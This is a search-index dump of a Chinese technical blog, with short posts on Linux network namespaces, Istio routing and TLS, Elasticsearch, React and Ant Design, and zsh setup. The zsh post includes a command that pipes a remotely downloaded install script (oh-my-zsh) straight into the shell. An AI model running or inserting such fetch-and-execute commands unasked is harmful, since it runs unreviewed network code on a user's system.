\u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 ... link/ether 56:84:7a:fe:97:99 brd ff:ff:ff:ff:ff:ff 5: veth22a38e6: \u003cBROADCAST,UP,LOWER_UP\u003e mtu 1500 qdisc ... link/ether 8e:30:2a:ac:8c:d1 brd ff:ff:ff:ff:ff:ff 那么，要做成这个样子应该怎么办呢？我们来看一组命令： ## 首先，我们先增加一个网桥lxcbr0，模仿docker0 brctl addbr lxcbr0 brctl stp lxcbr0 off ifconfig lxcbr0 192.168.10.1/24 up #为网桥设置IP地址 ## 接下来，我们要创建一个network namespace - ns1 # 增加一个namesapce 命令为 ns1 （使用ip netns add命令） ip netns add ns1 # 激活namespace中的loopback，即127.0.0.1（使用ip netns exec ns1来操作ns1中的命令） ip netns exec ns1 ip link set dev lo up ## 然后，我们需要增加一对虚拟网卡 # 增加一个pair虚拟网卡，注意其中的veth类型，其中一个网卡要按进容器中 ip link add veth-ns1 type veth peer name lxcbr0.1 # 把 veth-ns1 按到namespace ns1中，这样容器中就会有一个新的网卡了 ip link set veth-ns1 netns ns1 # 把容器里的 veth-ns1改名为 eth0 （容器外会冲突，容器内就不会了） ip netns exec ns1 ip link set dev veth-ns1 name eth0 # 为容器中的网卡分配一个IP地址，并激活它 ip netns exec ns1 ifconfig eth0 192.168.10.11/24 up # 上面我们把veth-ns1这个网卡按到了容器中，然后我们要把lxcbr0.1添加上网桥上 brctl addif lxcbr0 lxcbr0.1 # 为容器增加一个路由规则，让容器可以访问外面的网络 ip netns exec ns1 ip route add default via 192.168.10.1 # 在/etc/netns下创建network namespce名称为ns1的目录， # 然后为这个namespace设置resolv.conf，这样，容器内就可以访问域名了 mkdir -p /etc/netns/ns1 echo \"nameserver 8.8.8.8\" \u003e /etc/netns/ns1/resolv.conf 上面基本上就是docker网络的原理了，只不过， Docker的resolv.conf没有用这样的方式，而是用了上篇中的Mount Namesapce的那种方式 另外，docker是用进程的PID来做Network Namespace的名称的。 了解了这些后，你甚至可以为正在运行的docker容器增加一个新的网卡： ip link add peerA type veth peer name peerB brctl addif docker0 peerA ip link set peerA up ip link set peerB netns ${container-pid} ip netns exec ${container-pid} ip link set dev peerB name eth1 ip netns exec ${container-pid} ip link set eth1 up ; ip netns exec ${container-pid} ip addr add ${ROUTEABLE_IP} dev eth1 ; 上面的示例是我们为正在运行的docker容器，增加一个eth1的网卡，并给了一个静态的可被外部访问到的IP地址。 这个需要把外部的“物理网卡”配置成混杂模式，这样这个eth1网卡就会向外通过ARP协议发送自己的Mac地址，然后外部的交换机就会把到这个IP地址的包转到“物理网卡”上，因为是混杂模式，所以eth1就能收到相关的数据，一看，是自己的，那么就收到。这样，Docker容器的网络就和外部通了。 当然，无论是Docker的NAT方式，还是混杂模式都会有性能上的问题，NAT不用说了，存在一个转发的开销，混杂模式呢，网卡上收到的负载都会完全交给所有的虚拟网卡上，于是就算一个网卡上没有数据，但也会被其它网卡上的数据所影响。 这两种方式都不够完美，我们知道，真正解决这种网络问题需要使用VLAN技术，于是Google的同学们为Linux内核实现了一个IPVLAN的驱动，这基本上就是为Docker量身定制的。 ","date":"2021-11-07 20:09","objectID":"/post/2741/:0:1","tags":["linux"],"title":"Linux Network Namespace","uri":"/post/2741/"},{"categories":["其他","前端"],"content":" //判断是否内网IP function IsLAN(ip: string) { ip.toLowerCase(); if(ip=='localhost') return true; let a_ip = 0; if(ip == \"\") return false; const aNum = ip.split(\".\"); if(aNum.length != 4) return false; a_ip += parseInt(aNum[0]) \u003c\u003c 24; a_ip += parseInt(aNum[1]) \u003c\u003c 16; a_ip += parseInt(aNum[2]) \u003c\u003c 8; a_ip += parseInt(aNum[3]) \u003c\u003c 0; a_ip=a_ip\u003e\u003e16 \u0026 0xFFFF; return( a_ip\u003e\u003e8 == 0x7F || a_ip\u003e\u003e8 == 0xA || a_ip== 0xC0A8 || (a_ip\u003e=0xAC10 \u0026\u0026 a_ip\u003c=0xAC1F) ); } ","date":"2021-11-04 20:18","objectID":"/post/2738/:0:0","tags":["js"],"title":"js 判断是否内网IP","uri":"/post/2738/"},{"categories":["其他"],"content":"feat：新功能（feature） fix：修补bug docs：文档（documentation） style： 格式（不影响代码运行的变动） refactor：重构（即不是新增功能，也不是修改bug的代码变动） test：增加测试 chore：构建过程或辅助工具的变动 ","date":"2021-11-04 14:35","objectID":"/post/2737/:0:0","tags":["git"],"title":"git commit","uri":"/post/2737/"},{"categories":["系统服务"],"content":"一、NRT(近实时) 从数据被写到ES到可被检索可以达到秒级 ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:1","tags":["elasticsearch"],"title":"elasticsearch核心概念","uri":"/post/2735/"},{"categories":["系统服务"],"content":"二、Document(文档) 理解为一个JSON数据。比如下面是一个商品文档 { \"name\": \"键盘\", \"desc\": \"这是一个红轴键盘\", \"price\": 1200, \"brand\": \"cherry\", } ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:2","tags":["elasticsearch"],"title":"elasticsearch核心概念","uri":"/post/2735/"},{"categories":["系统服务"],"content":"三、Field(字段) 文档中的属性,理解为json中的key ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:3","tags":["elasticsearch"],"title":"elasticsearch核心概念","uri":"/post/2735/"},{"categories":["系统服务"],"content":"四、Index(索引) 一个index包含多个数据结构相似的document。 ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:4","tags":["elasticsearch"],"title":"elasticsearch核心概念","uri":"/post/2735/"},{"categories":["系统服务"],"content":"五、Type(类型) 每个索引中可以包含多个type，type可以为index做逻辑分类,不同的分类可以定义不同的field。比如一个商品索引，可以包含许多不同种类的商品，不同种类的商品数据结构字段可能不相同。举个例子: 下面有两个商品 外设分类 { \"name\": \"键盘\", \"desc\": \"这是一个红轴键盘\", \"price\": 1200, \"brand\": \"cherry\" } 食品分类 { \"name\": \"方便面\", \"desc\": \"香辣牛肉面\", \"price\": 15, \"shelfLife\": \"6个月\" } ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:5","tags":["elasticsearch"],"title":"elasticsearch核心概念","uri":"/post/2735/"},{"categories":["系统服务"],"content":"六、Mapping(映射) 映射是定义文档如何存储和索引的过程，所以创建索引时要指定索引和文档的映射关系。例如下面定义了字段的数据类型 { \"mappings\": { \"peripheral\": { \"properties\": { \"name\": {\"type\": \"string\"}, \"desc\": {\"type\": \"string\"}, \"price\": {\"type\": \"double\"}, \"brand\": {\"type\": \"string\"} } } } } ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:6","tags":["elasticsearch"],"title":"elasticsearch核心概念","uri":"/post/2735/"},{"categories":["系统服务"],"content":"七、Shard(分片) Shard也称为Primary Shard es可以将一个索引中的数据切分成多个较小的Shard，分布在不同的Node上存储。 ES会把查询发送给每个相关的分片,从而提高吞吐量。这样就可以解决单台机器性能瓶颈问题。 默认情况下有5个Primary Shard ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:7","tags":["elasticsearch"],"title":"elasticsearch核心概念","uri":"/post/2735/"},{"categories":["系统服务"],"content":"八、Replica(副本) Replica也称为Replica Shard 当某个Node发生故障时,shard会处于丢失状态,因此可以为每个shard创建多个副本。好处如下 冗余能力 当某个Node故障时可以使用其他Node中的replica来作为备用。 提高检索性能 Replica Shard也可以提供查询的能力，所以在执行多个检索操作的时候可以将请求发送到不通的副本中 默认情况下每个Primary Shard有1个Replica Shard。Replica Shard不能和Primary Shard在同一节点上。 ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:8","tags":["elasticsearch"],"title":"elasticsearch核心概念","uri":"/post/2735/"},{"categories":["前端"],"content":"1.获取当前月份的第一天\u0026最后一天 moment().startOf('month').format(\"YYYY-MM-DD\") moment().endOf('month').format(\"YYYY-MM-DD\") ","date":"2021-10-28 22:28","objectID":"/post/2733/:0:1","tags":["antd pro","react","nodejs","antd"],"title":"moment获取各种时间","uri":"/post/2733/"},{"categories":["前端"],"content":"2.获取当前的日期 moment().format('YYYY-MM-DD') ","date":"2021-10-28 22:28","objectID":"/post/2733/:0:2","tags":["antd pro","react","nodejs","antd"],"title":"moment获取各种时间","uri":"/post/2733/"},{"categories":["前端"],"content":"3.获取今年的日期范围 moment().startOf('year').format('YYYY-MM-DD') moment().endOf('year').format('YYYY-MM-DD') ","date":"2021-10-28 22:28","objectID":"/post/2733/:0:3","tags":["antd pro","react","nodejs","antd"],"title":"moment获取各种时间","uri":"/post/2733/"},{"categories":["前端"],"content":"4.时间加减 // 获取明天的日期 moment().add(1,'days').format('YYYY-MM-DD') // 获取昨天的日期 moment().add(-1,'days').format('YYYY-MM-DD') ","date":"2021-10-28 22:28","objectID":"/post/2733/:0:4","tags":["antd pro","react","nodejs","antd"],"title":"moment获取各种时间","uri":"/post/2733/"},{"categories":["前端"],"content":"两种 return( \u003c\u003e {/* 珊格-Flex填充 */} \u003cDivider orientation=\"left\"\u003eRaw flex style\u003c/Divider\u003e \u003cRow gutter={[16,16]}\u003e \u003cCol flex=\"1 1 400px\"\u003e \u003cProCard\u003e1\u003c/ProCard\u003e \u003c/Col\u003e \u003cCol flex=\"1 1 400px\"\u003e \u003cProCard\u003e2\u003c/ProCard\u003e \u003c/Col\u003e \u003cCol flex=\"1 1 400px\"\u003e \u003cProCard\u003e3\u003c/ProCard\u003e \u003c/Col\u003e \u003c/Row\u003e {/* gutter设置珊格之间的水平和垂直间距 colSpan设置在不同窗口大小下的显示大小。一行占满是24。 窗口大小从小到大分别是xs, sm, md, lg, xl */} \u003cProCard style={{ marginTop: 8 }} gutter={[16, 16]} wrap\u003e \u003cProCard colSpan={{sm: 24, md: 8}} bordered headerBordered title=\"bt1\" extra=\"extra\" tooltip=\"这是提示\"\u003e Col \u003c/ProCard\u003e \u003cProCard colSpan={{sm: 24, md: 8}} bordered headerBordered title=\"bt2\" extra=\"extra\" tooltip=\"这是提示\"\u003e Col \u003c/ProCard\u003e \u003cProCard colSpan={{sm: 24, md: 8}} bordered headerBordered title=\"bt3\" extra=\"extra\" tooltip=\"这是提示\"\u003e Col \u003c/ProCard\u003e \u003c/ProCard\u003e \u003c/\u003e ); ","date":"2021-10-26 13:57","objectID":"/post/2731/:0:0","tags":["antd pro","react","antd"],"title":"ant design组件响应式换行","uri":"/post/2731/"},{"categories":["kubernetes","Istio"],"content":"背景 当我们有两个virtualservice并且路由匹配都是使用match.uri.prefix,第一个路由r1是匹配/it前缀，第二个路由r2匹配/item前缀。 这时你会发现无论是访问/it、/it/、/it/xxx，/item，/item/，/item/xx都会匹配到r1对应的服务。 由于vs不支持priority，可以通过下面几种方法解决 合并virtualservice(推荐) 使用regex匹配路由 写一个prefix: /it/ 一个exact: /it 下面使用regex的方式来解决这个问题。 ","date":"2021-10-20 23:28","objectID":"/post/2729/:0:1","tags":["istio"],"title":"解决virtualservice前缀路由匹配冲突问题","uri":"/post/2729/"},{"categories":["kubernetes","Istio"],"content":"一、部署测试服务 部署两个nginx服务用于测试路由 apiVersion: apps/v1 kind: Deployment metadata: name: n1 namespace: istio-demo spec: replicas: 1 selector: matchLabels: app: nginx version: v1 template: metadata: labels: app: nginx version: v1 spec: containers: - name: nginx image: nginx:1.14-alpine imagePullPolicy: IfNotPresent ports: - name: http containerPort: 80 --- apiVersion: v1 kind: Service metadata: name: n1-svc namespace: istio-demo spec: type: ClusterIP ports: - name: http port: 80 targetPort: 80 selector: app: nginx version: v1 --- apiVersion: apps/v1 kind: Deployment metadata: name: n2 namespace: istio-demo spec: replicas: 1 selector: matchLabels: app: nginx version: v2 template: metadata: labels: app: nginx version: v2 spec: containers: - name: nginx image: nginx:1.14-alpine imagePullPolicy: IfNotPresent ports: - name: http containerPort: 80 --- apiVersion: v1 kind: Service metadata: name: n2-svc namespace: istio-demo spec: type: ClusterIP ports: - name: http port: 80 targetPort: 80 selector: app: nginx version: v2 上面只是单纯的创建了两个nginx应用和两个service，后面通过浏览器访问，观察nginx日志来确认流量进入了哪个应用 ","date":"2021-10-20 23:28","objectID":"/post/2729/:0:2","tags":["istio"],"title":"解决virtualservice前缀路由匹配冲突问题","uri":"/post/2729/"},{"categories":["kubernetes","Istio"],"content":"二、配置有问题的路由规则 apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: r1 namespace: istio-demo spec: gateways: - istio-system/public-gateway hosts: - 'n1-svc' - 'headers.t.cn' http: - route: - destination: host: n1-svc match: - uri: prefix: '/it' --- apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: r2 namespace: istio-demo spec: gateways: - istio-system/public-gateway hosts: - 'n2-svc' - 'headers.t.cn' http: - route: - destination: host: n2-svc match: - uri: prefix: /item 测试访问情况: 首先打开两个控制台观察pod的日志 在浏览器访问/it、/it/、/it/xxx、/item、/item/、/item/xxx均访问到n1服务上(n2服务的规则失效) 删除n1的路由匹配规则，此时/item、/item/、/item/xxx均访问到n2服务上 ","date":"2021-10-20 23:28","objectID":"/post/2729/:0:3","tags":["istio"],"title":"解决virtualservice前缀路由匹配冲突问题","uri":"/post/2729/"},{"categories":["kubernetes","Istio"],"content":"解决方法 修改prefix为regex apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: r1 namespace: istio-demo spec: gateways: - istio-system/public-gateway hosts: - 'n1-svc' - 'headers.t.cn' http: - route: - destination: host: n1-svc match: - uri: # 匹配/it/开头或/it的uri regex: '(\\/it\\/.*)|(\\/it\\/?)' --- apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: r2 namespace: istio-demo spec: gateways: - istio-system/public-gateway hosts: - 'n2-svc' - 'headers.t.cn' http: - route: - destination: host: n2-svc match: - uri: # 匹配/item/开头或/item的uri,这里其实不改也可以,因为r1路由已经不会影响到r2路由了 regex: '(\\/item\\/.*)|(\\/item\\/?)' 经测试 访问/it、/it/、/it/xxx会路由到n1应用 访问/item、/item/、/item/xxx会路由到n2应用 ","date":"2021-10-20 23:28","objectID":"/post/2729/:0:4","tags":["istio"],"title":"解决virtualservice前缀路由匹配冲突问题","uri":"/post/2729/"},{"categories":["kubernetes","Istio"],"content":"http rewrite apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: web-server-headers spec: gateways: - istio-system/public-gw hosts: - '*' http: - match: - uri: prefix: '/headers/' - uri: prefix: '/headers' rewrite: uri: '/' route: - destination: host: web-server-headers port: number: 5000 当我们访问: http://ops.cn/headers/version，上面的例子中如果没有rewrite,那么我们的后台服务收到的请求将是/headers/version。有时候我们的服务只需要/version。所以我们配置rewrite，将/headers/和/headers重写为/，然后交给后台服务 ","date":"2021-10-15 11:29","objectID":"/post/2723/:0:1","tags":["k8s","istio","servicemesh"],"title":"Istio-virtualservice功能测试","uri":"/post/2723/"},{"categories":["kubernetes","Istio"],"content":"http redirect apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: web-server-headers spec: gateways: - istio-system/public-gw hosts: - '*' http: - match: - uri: prefix: '/headers/' - uri: prefix: '/headers' redirect: authority: soulchild.cn redirectCode: 301 uri: '/aaa' 客户端将会重定向到指定的站点。authority指定重定向到哪个主机,redirectCode是响应状态码，uri是请求的路径 ","date":"2021-10-15 11:29","objectID":"/post/2723/:0:2","tags":["k8s","istio","servicemesh"],"title":"Istio-virtualservice功能测试","uri":"/post/2723/"},{"categories":["kubernetes","Istio"],"content":"fault 这里有个疑问,故障注入的延迟是发生在哪里的？客户端还是服务端的sidecar？ apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: web-server-headers spec: gateways: - istio-system/public-gw hosts: - '*' http: - match: - uri: prefix: '/headers/' - uri: prefix: '/headers' rewrite: uri: '/' fault: delay: fixedDelay: 10s percent: 100 route: - destination: host: web-server-headers port: number: 5000 测试流量的方法: 开启一个客户端POD 抓取istio-ingressgateway这个POD的数据包(只抓取客户端POD的IP和后端服务的IP) 抓取后端服务POD的数据包(只抓取gateway的IP) 客户端POD请求目标服务(curl -I http://istio-ingressgateway.istio-system/headers) 观察数据包情况 分析: 当curl执行后gateway马上出现请求包，后端服务的数据包没有内容。 等待10s后，gateway才将请求转发到后端服务，此时后端服务收到数据包并响应。 由此可见延迟的故障注入是发生在服务的请求方的， 最后注意: 上面的配置仅对gateway生效,如果想在网格内生效请在gateways添加mesh。添加mesh后同样故障注入是在client端的 未完待续。。。 ","date":"2021-10-15 11:29","objectID":"/post/2723/:0:3","tags":["k8s","istio","servicemesh"],"title":"Istio-virtualservice功能测试","uri":"/post/2723/"},{"categories":["kubernetes","devops"],"content":"见图 68027-jkuckk0nldl.png ","date":"2021-10-15 09:35","objectID":"/post/2720/:0:0","tags":["k8s","devops","tekton"],"title":"tekton-trigger","uri":"/post/2720/"},{"categories":["其他","基础内容"],"content":"安装oh-my-zsh # 安装oh-my-zsh sh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" 没有zsh需要先安装zsh。 yum install zsh ","date":"2021-10-14 17:36","objectID":"/post/2717/:1:0","tags":["zsh"],"title":"zsh安装配置","uri":"/post/2717/"},{"categories":["其他","基础内容"],"content":"修改主题 vim ~/.zshrc ZSH_THEME=\"robbyrussell\" ","date":"2021-10-14 17:36","objectID":"/post/2717/:2:0","tags":["zsh"],"title":"zsh安装配置","uri":"/post/2717/"},{"categories":["其他","基础内容"],"content":"修改命令行样式: vim ~/.oh-my-zsh/themes/robbyrussell.zsh-theme PROMPT=\"%(?:%{$fg_bold[green]%} [em..] ➜ :%{$fg_bold[red]%} [em..] ➜ )\" ","date":"2021-10-14 17:36","objectID":"/post/2717/:3:0","tags":["zsh"],"title":"zsh安装配置","uri":"/post/2717/"},{"categories":["kubernetes"],"content":"解决方法: 修改argocd-ssh-known-hosts-cm这个configmap，添加要信任的主机公钥信息。 公钥信息可以通过其他已连接过的主机中的known_hosts获取. 也可以通过类似ssh-keyscan gitlab.soulchild.cn获取 这个configmap被挂载到argocd-server和argocd-repo-server POD中的/app/config/ssh目录下。 ","date":"2021-10-13 10:22","objectID":"/post/2714/:0:0","tags":["argocd"],"title":"argocd Unable to connect SSH repository: ssh: handshake failed: knownhosts: key is unknown","uri":"/post/2714/"},{"categories":["Istio"],"content":"一、 部署正常服务 1.初始化 # 创建ns k create ns istio-demo # 开启自动注入 k label ns istio-demo istio-injection=enabled 2.部署nginx apiVersion: apps/v1 kind: Deployment metadata: name: nginx-v1 namespace: istio-demo spec: replicas: 1 selector: matchLabels: app: nginx version: v1 template: metadata: labels: app: nginx version: v1 spec: initContainers: - name: busybox image: busybox volumeMounts: - name: www mountPath: /tmp command: [\"sh\", \"-c\", \"echo 'v1' \u003e /tmp/index.html\"] containers: - name: nginx image: nginx:1.14-alpine imagePullPolicy: IfNotPresent ports: - name: http containerPort: 80 volumeMounts: - name: www mountPath: /usr/share/nginx/html/ volumes: - name: www emptyDir: {} --- apiVersion: v1 kind: Service metadata: name: nginx-svc namespace: istio-demo spec: type: ClusterIP ports: - name: http port: 80 targetPort: 80 selector: app: nginx 3.暴露服务 apiVersion: networking.istio.io/v1alpha3 kind: Gateway metadata: name: nginx-gw namespace: istio-demo spec: selector: istio: ingressgateway servers: - hosts: - \"nginx-istio.ops.cn\" port: number: 80 name: http protocol: HTTP --- apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: nginx-vs namespace: istio-demo spec: exportTo: - \"*\" gateways: - nginx-gw hosts: - 'nginx-svc' - 'nginx-istio.ops.cn' http: - route: - destination: host: nginx-svc subset: v1 weight: 100 - destination: host: nginx-svc subset: v2 --- apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: nginx-dr namespace: istio-demo spec: host: nginx-svc subsets: - name: v1 labels: version: v1 - name: v2 labels: version: v2 访问测试: 77024-rhlfdm1gsi.png ","date":"2021-10-08 16:35","objectID":"/post/2709/:0:1","tags":["k8s","istio"],"title":"Istio 配置istio-ingressgateway 单向TLS","uri":"/post/2709/"},{"categories":["Istio"],"content":"二、修改为https访问 在我们这里例子中只需要修改gw就可以了,首先需要准备证书和私钥,这一步略过了(配置自签证书) 第二步: 创建一个包含证书信息的secret k create -n istio-system secret generic nginx-istio.ops.cn-tls \\ --from-file=key=tls/ops.cn_key \\ --from-file=cert=tls/ops.cn_crt 第三步: 修改Gateway apiVersion: networking.istio.io/v1beta1 kind: Gateway metadata: name: nginx-gw namespace: istio-demo spec: selector: istio: ingressgateway servers: - hosts: - nginx-istio.ops.cn port: name: http number: 80 protocol: HTTP - hosts: - nginx-istio.ops.cn port: name: https number: 8443 protocol: HTTPS tls: credentialName: nginx-istio.ops.cn-tls mode: SIMPLE 第四步: 验证 由于是自签名证书所以是不受信任的 02399-p8i08e0sjzg.png ","date":"2021-10-08 16:35","objectID":"/post/2709/:0:2","tags":["k8s","istio"],"title":"Istio 配置istio-ingressgateway 单向TLS","uri":"/post/2709/"},{"categories":["kubernetes","Istio"],"content":"Istio中的正则(RE2)使用起来不习惯,防止忘记特留此文 apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: nginx-vs namespace: istio-demo spec: exportTo: - '*' hosts: - nginx-svc http: - match: - headers: Cookie: regex: ^(.*?; )?(user=soulchild)(;.*)?$ route: - destination: host: nginx-svc subset: v2 - route: - destination: host: nginx-svc subset: v1 ","date":"2021-10-08 15:14","objectID":"/post/2708/:0:0","tags":["k8s","istio"],"title":"Istio virtualservice匹配cookie","uri":"/post/2708/"},{"categories":["其他"],"content":"基本路由配置 BrowserRouter/HashRouter 路由呈现方式。前者是xxx/xxx/xxx,后者是/#/ Switch 使用这个组件后，仅匹配第一个路由 Route - exact/path/component 匹配路由的模式 Link/NavLink 实现路由跳转的组件 。。。。。。 动态路由配置 /detail/2021 Redirect/404 JS ","date":"2021-10-06 21:26","objectID":"/post/2705/:0:0","tags":[],"title":"React入门学习-React-Router(四)","uri":"/post/2705/"},{"categories":["前端"],"content":"本文接着使用上一篇的项目代码 ","date":"2021-10-06 20:43","objectID":"/post/2704/:0:0","tags":["antd pro","react","antd"],"title":"React入门学习-Ant Design(三)","uri":"/post/2704/"},{"categories":["前端"],"content":"安装Antd yarn add antd ","date":"2021-10-06 20:43","objectID":"/post/2704/:0:1","tags":["antd pro","react","antd"],"title":"React入门学习-Ant Design(三)","uri":"/post/2704/"},{"categories":["前端"],"content":"使用antd组件 修改src/App.js // 添加如下两行引入antd组件 import { Input, Button } from \"antd\" import 'antd/dist/antd.css' // 修改之前的input和button \u003cInput type=\"text\" style={{width: 200}} value={val} onChange={this.handleChange} /\u003e \u003cButton type=\"primary\" onClick={this.handleAdd}\u003e添加\u003c/Button\u003e ","date":"2021-10-06 20:43","objectID":"/post/2704/:0:2","tags":["antd pro","react","antd"],"title":"React入门学习-Ant Design(三)","uri":"/post/2704/"},{"categories":["前端"],"content":"使用search组件实现添加 1.定义search组件 const Search = Input.Search 2.使用Search组件，最终代码如下 // import './App.css'; import React from \"react\"; import { Input, Button } from \"antd\" import 'antd/dist/antd.css' const Search = Input.Search class App extends React.Component{ state = { val: '', li: [] } handleChange = (event) =\u003e { this.setState({ val: event.target.value }) } handleAdd = () =\u003e { const { val, li } = this.state li.push(val) this.setState({ li }) console.log(this.state) } handleSearch = (value) =\u003e { const { li } = this.state li.push(value) this.setState({ li }) } render(){ const { val, li } = this.state return \u003cdiv\u003e \u003cInput type=\"text\" style={{width: 200}} value={val} onChange={this.handleChange} /\u003e \u003cButton type=\"primary\" onClick={this.handleAdd}\u003e添加\u003c/Button\u003e \u003cSearch placeholder=\"input search text\" allowClear enterButton=\"添加\" size=\"middle\" style={{width: 270}} onSearch={this.handleSearch} /\u003e \u003cul\u003e { li.map((item, index)=\u003e{ return \u003cli key={index}\u003e{item}\u003c/li\u003e }) } \u003c/ul\u003e \u003c/div\u003e } } export default App; ","date":"2021-10-06 20:43","objectID":"/post/2704/:0:3","tags":["antd pro","react","antd"],"title":"React入门学习-Ant Design(三)","uri":"/post/2704/"},{"categories":["前端"],"content":"使用Select组件 // import './App.css'; import React from \"react\"; import { Input, Button, Select } from \"antd\" import 'antd/dist/antd.css' const Search = Input.Search const Option = Select class App extends React.Component{ state = { val: '', li: [] } handleChange = (event) =\u003e { this.setState({ val: event.target.value }) } handleAdd = () =\u003e { const { val, li } = this.state li.push(val) this.setState({ li }) console.log(this.state) } handleSearch = (value) =\u003e { const { li } = this.state li.push(value) this.setState({ li }) } render(){ const { val, li } = this.state return \u003cdiv\u003e \u003cInput type=\"text\" style={{width: 200}} value={val} onChange={this.handleChange} /\u003e \u003cButton type=\"primary\" onClick={this.handleAdd}\u003e添加\u003c/Button\u003e \u003cSearch placeholder=\"input search text\" allowClear enterButton=\"添加\" size=\"middle\" style={{width: 270}} onSearch={this.handleSearch} /\u003e \u003cSelect defaultValue=\"\" style={{ width: 120 }}\u003e {li.map((item, index)=\u003e{ return \u003cOption value={item} key={index}\u003e{item}\u003c/Option\u003e })} \u003c/Select\u003e \u003cul\u003e { li.map((item, index)=\u003e{ return \u003cli key={index}\u003e{item}\u003c/li\u003e }) } \u003c/ul\u003e \u003c/div\u003e } } export default App; ","date":"2021-10-06 20:43","objectID":"/post/2704/:0:4","tags":["antd pro","react","antd"],"title":"React入门学习-Ant Design(三)","uri":"/post/2704/"},{"categories":["前端"],"content":"安装创建脚手架的命令 cnpm install create-react-app -g ","date":"2021-10-06 14:38","objectID":"/post/2703/:0:1","tags":["react","antd"],"title":"React入门学习-脚手架(二)","uri":"/post/2703/"},{"categories":["前端"],"content":"创建项目 create-react-app react-learn-1 cd react-learn-1 ","date":"2021-10-06 14:38","objectID":"/post/2703/:0:2","tags":["react","antd"],"title":"React入门学习-脚手架(二)","uri":"/post/2703/"},{"categories":["前端"],"content":"运行项目 cd react-learn-1 yarn start ","date":"2021-10-06 14:38","objectID":"/post/2703/:0:3","tags":["react","antd"],"title":"React入门学习-脚手架(二)","uri":"/post/2703/"},{"categories":["前端"],"content":"Todo-demo示例 修改src/App.js // import './App.css'; import React from \"react\"; class App extends React.Component{ state = { val: '', li: [] } handleChange = (event) =\u003e { this.setState({ val: event.target.value }) } handleAdd = () =\u003e { const { val, li } = this.state li.push(val) this.setState({ li }) console.log(this.state) } render(){ const { val, li } = this.state return \u003cdiv\u003e \u003cinput type=\"text\" value={val} onChange={this.handleChange} /\u003e \u003cbutton onClick={this.handleAdd}\u003e添加\u003c/button\u003e \u003cul\u003e { li.map((item, index)=\u003e{ return \u003cli key={index}\u003e{item}\u003c/li\u003e }) } \u003c/ul\u003e \u003c/div\u003e } } export default App; ","date":"2021-10-06 14:38","objectID":"/post/2703/:0:4","tags":["react","antd"],"title":"React入门学习-脚手架(二)","uri":"/post/2703/"},{"categories":["前端"],"content":"基本语法 # 创建元素、标签 React.createElement() # 渲染元素到指定的位置 ReactDOM.render() # React.Component ","date":"2021-10-05 23:08","objectID":"/post/2698/:0:1","tags":["react"],"title":"React入门学习-基础(一)","uri":"/post/2698/"},{"categories":["前端"],"content":"例子中的html \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003cscript src=\"./node_modules/react/umd/react.development.js\"\u003e\u003c/script\u003e \u003cscript src=\"./node_modules/react-dom/umd/react-dom.development.js\"\u003e\u003c/script\u003e \u003cscript src=\"https://unpkg.com/babel-standalone@6.26.0/babel.js\"\u003e\u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=\"app\"\u003e\u003c/div\u003e \u003cscript type=\"text/babel\"\u003e 例子中的代码在这里 \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2021-10-05 23:08","objectID":"/post/2698/:0:2","tags":["react"],"title":"React入门学习-基础(一)","uri":"/post/2698/"},{"categories":["前端"],"content":"JSX js中写html，html中写js。 例子 # 将ele元素渲染到id=app的标签中。这里没有使用React.createElement()，而是使用的es6的语法糖 var name = 'soulchild'; var ele = \u003ch1 className=\"myclass\" \u003ehello {name}\u003c/h1\u003e; ReactDOM.render(ele,document.getElementById('app')); ","date":"2021-10-05 23:08","objectID":"/post/2698/:0:3","tags":["react"],"title":"React入门学习-基础(一)","uri":"/post/2698/"},{"categories":["前端"],"content":"组件和props 函数式组件(无状态) # 将元素内容定义在函数中，使用return返回。函数名就是组件名。 function Info(props){ return \u003cdiv\u003e \u003ch1\u003e姓名: {props.name}\u003c/h1\u003e \u003cp\u003e年龄: {props.age}\u003c/p\u003e \u003cp\u003e擅长: 梦游\u003c/p\u003e \u003c/div\u003e } ReactDOM.render( \u003cInfo name=\"SoulChild\" age=\"18\" /\u003e, document.getElementById('app') ) 类组件(有状态) # 需要继承React.Component，class组件还需要render+return。 # 类组件在调用时会创建一个实例，然后通过调用实例里的render方法来获取元素。 class InfoPlus extends React.Component{ render(){ return \u003cdiv\u003e \u003ch1\u003e姓名: {this.props.name}\u003c/h1\u003e \u003cp\u003e年龄: {this.props.age}\u003c/p\u003e \u003cp\u003e擅长: 梦游\u003c/p\u003e \u003c/div\u003e } } ReactDOM.render( \u003cInfoPlus name=\"SoulChild\" age=\"18\" /\u003e, document.getElementById('app') ) ","date":"2021-10-05 23:08","objectID":"/post/2698/:0:4","tags":["react"],"title":"React入门学习-基础(一)","uri":"/post/2698/"},{"categories":["前端"],"content":"React生命周期 93784-ecbxjjqy50i.png Initialization-组件初始化阶段 Mounting-组件加载阶段 Updation-数据更新阶段 Unmointing-组件销毁阶段 class InfoPlus extends React.Component{ // 定义钩子函数 constructor(props){ // 初始化props super(props); // 初始化state this.state= { name: 'SoulChild', age: '18' } console.log('Initialization-数据初始化阶段') } componentWillMount(){ 